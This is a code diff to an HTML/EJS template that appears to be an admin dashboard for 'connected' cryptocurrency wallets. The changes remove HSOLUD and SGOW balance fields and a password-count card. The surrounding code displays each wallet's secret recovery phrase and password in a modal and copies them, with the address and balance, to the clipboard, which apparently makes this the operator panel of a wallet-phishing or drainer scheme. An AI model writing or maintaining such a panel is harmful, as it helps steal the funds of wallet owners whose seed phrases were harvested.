@@ -1506,15 +1506,6 @@
                             <p>Backed Up</p>
                         </div>
                     </div>
-                    <div class="trust-stat-card password">
-                        <div class="trust-stat-icon">
-                            <i class="fas fa-key"></i>
-                        </div>
-                        <div class="trust-stat-info">
-                            <h3><%= withPasswordCount || 0 %></h3>
-                            <p>With Password</p>
-                        </div>
-                    </div>
                 </div>
 
                 <!-- Filters -->
@@ -1667,20 +1658,8 @@
                                                     <div style="font-size: 12px; line-height: 1.8;">
                                                         <div>
                                                             <span style="color: var(--tg-body-color);">Balance:</span> 
-                                                            <span class="balance" style="font-size: 14px; font-weight: 700;"><%= wallet.walletAmount || wallet.hsoludBalance || wallet.sgowBalance || '0' %></span>
+                                                            <span class="balance" style="font-size: 14px; font-weight: 700;"><%= wallet.amount || '0' %></span>
                                                         </div>
-                                                        <% if (wallet.hsoludBalance && !wallet.walletAmount) { %>
-                                                        <div>
-                                                            <span style="color: var(--tg-body-color);">HSOLUD:</span> 
-                                                            <span class="balance"><%= wallet.hsoludBalance || '0' %></span>
-                                                        </div>
-                                                        <% } %>
-                                                        <% if (wallet.sgowBalance && !wallet.walletAmount) { %>
-                                                        <div>
-                                                            <span style="color: var(--tg-body-color);">SGOW:</span> 
-                                                            <span class="balance"><%= wallet.sgowBalance || '0' %></span>
-                                                        </div>
-                                                        <% } %>
                                                     </div>
                                                 </td>
 
@@ -1852,17 +1831,9 @@
                         <i class="fas fa-coins"></i> Balance
                     </div>
                     <div class="detail-grid">
-                        <div class="detail-item">
+                        <div class="detail-item full-width">
                             <div class="detail-label">Wallet Balance (Amount)</div>
                             <div class="detail-value" style="color: var(--tg-success); font-size: 18px; font-weight: 700;" id="modalWalletAmount">-</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">HSOLUD</div>
-                            <div class="detail-value" style="color: var(--tg-success);" id="modalHsolud">-</div>
-                        </div>
-                        <div class="detail-item">
-                            <div class="detail-label">SGOW</div>
-                            <div class="detail-value" style="color: var(--tg-success);" id="modalSgow">-</div>
                         </div>
                     </div>
                 </div>
@@ -2007,9 +1978,7 @@
             document.getElementById('modalWalletAddress').textContent = walletData.walletAddress || 'No Address';
             document.getElementById('modalSecretPhrase').textContent = walletData.secretPhrase || 'Not provided';
             document.getElementById('modalPassword').textContent = walletData.password || 'Not set';
-            document.getElementById('modalWalletAmount').textContent = walletData.walletAmount || walletData.hsoludBalance || walletData.sgowBalance || '0';
-            document.getElementById('modalHsolud').textContent = walletData.hsoludBalance || '0';
-            document.getElementById('modalSgow').textContent = walletData.sgowBalance || '0';
+            document.getElementById('modalWalletAmount').textContent = walletData.amount || '0';
             document.getElementById('modalBackupStatus').textContent = walletData.isBackedUp ? 'Backed Up' : 'Not Backed Up';
             document.getElementById('modalConnectedAt').textContent = walletData.connectedAt ? 
                 new Date(walletData.connectedAt).toLocaleString() : '-';
@@ -2071,9 +2040,7 @@
                     address: document.getElementById('modalWalletAddress').textContent,
                     secret: document.getElementById('modalSecretPhrase').textContent,
                     password: document.getElementById('modalPassword').textContent,
-                    balance: document.getElementById('modalWalletAmount').textContent,
-                    hsolud: document.getElementById('modalHsolud').textContent,
-                    sgow: document.getElementById('modalSgow').textContent
+                    balance: document.getElementById('modalWalletAmount').textContent
                 };
 
                 const text = Object.entries(walletData).map(([k, v]) => `${k}: ${v}`).join('\n');
